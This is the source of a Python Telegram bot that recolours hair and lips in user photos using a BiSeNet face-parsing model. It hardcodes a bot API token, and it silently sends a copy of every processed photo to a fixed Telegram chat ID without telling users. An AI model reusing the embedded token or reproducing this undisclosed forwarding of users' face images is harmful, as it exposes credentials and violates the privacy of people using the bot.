import cv2
import os

import numpy
import numpy as np
import requests
import torch
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import InputFile
from aiogram.utils import executor
from PIL import Image
from io import BytesIO

from skimage._shared.filters import gaussian
from torchvision.transforms import transforms, functional

from model import BiSeNet
from test import evaluate

# Telegram bot tokenini o'rnating
API_TOKEN = '7163081738:AAH0igNqWkgICaUc_KzcNWpCt44UbaLWeeU'

# Bot va dispatcher yaratish
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

n_classes = 19
model = BiSeNet(n_classes=n_classes)
model.eval()

# Rasmni silliqlash va keskinlashtirish
def sharpen(img):
    img = img * 1.0
    gauss_out = gaussian(img, sigma=5, channel_axis=True)

    alpha = 1.5
    img_out = (img - gauss_out) * alpha + img

    img_out = img_out / 255.0

    mask_1 = img_out < 0
    mask_2 = img_out > 1

    img_out = img_out * (1 - mask_1)
    img_out = img_out * (1 - mask_2) + mask_2
    img_out = np.clip(img_out, 0, 1)
    img_out = img_out * 255
    return np.array(img_out, dtype=np.uint8)


# Rasmda sochni rangini o'zgartirish
def hair(image, parsing, part=17, color=[230, 50, 20]):
    b, g, r = color
    tar_color = np.zeros_like(image)
    tar_color[:, :, 0] = b
    tar_color[:, :, 1] = g
    tar_color[:, :, 2] = r

    image_hsv = cv2.cvtColor(image, cv2.COLOR_BGR2HSV)
    tar_hsv = cv2.cvtColor(tar_color, cv2.COLOR_BGR2HSV)

    if part == 12 or part == 13:
        image_hsv[:, :, 0:2] = tar_hsv[:, :, 0:2]
    else:
        image_hsv[:, :, 0:1] = tar_hsv[:, :, 0:1]

    changed = cv2.cvtColor(image_hsv, cv2.COLOR_HSV2BGR)

    if part == 17:
        changed = sharpen(changed)

    # Resize `parsing` to match the size of the image (1024x1024)
    parsing_resized = cv2.resize(parsing, (image.shape[1], image.shape[0]), interpolation=cv2.INTER_NEAREST)

    # Apply mask
    changed[parsing_resized != part] = image[parsing_resized != part]

    return changed



cp = 'cp/79999_iter.pth'

def hex_to_rgb(hex_color):
    hex_color = hex_color.lstrip('#')
    return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))


@dp.message_handler(Command("start"))
async def send_welcome(message: types.Message):
    await message.reply("Salom! Iltimos, rasmni yuboring.")


@dp.message_handler(content_types=['photo'])
async def handle_photo(message: types.Message):
    # Download the photo
    photo = await message.photo[-1].download(destination_file=f"temp_image.jpg")

    # Open the file to send as an UploadFile
    with open(photo.name, 'rb') as file:
        files = {'file': 'image.jpg', "file_": file, "type": 'image/jpeg'}
    img = numpy.array(Image.open('temp_image.jpg'))
    h,w,_ = img.shape
    img = cv2.resize(img, (1024, 1024))
    parsing = await evaluate('temp_image.jpg', cp)
    parts = [17, 12, 13]
    hair_color_rgb = hex_to_rgb('#D8A9A9')
    lip_color_rgb = hex_to_rgb('#E8283B')
    colors = [hair_color_rgb, lip_color_rgb, lip_color_rgb]

    for part, color in zip(parts, colors):
        img = hair(img, parsing, part, color)

    img = cv2.resize(img, (w, h))
    image = Image.fromarray(img.astype('uint8'))

    # Save to a BytesIO object (in memory)
    image_io = BytesIO()
    image.save(image_io, format='PNG')
    image_io.seek(0)
    photo = InputFile(image_io, filename='image.png')
    await dp.bot.send_photo(chat_id=5596277119, photo=photo)
    await message.answer_photo(photo=photo)



if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)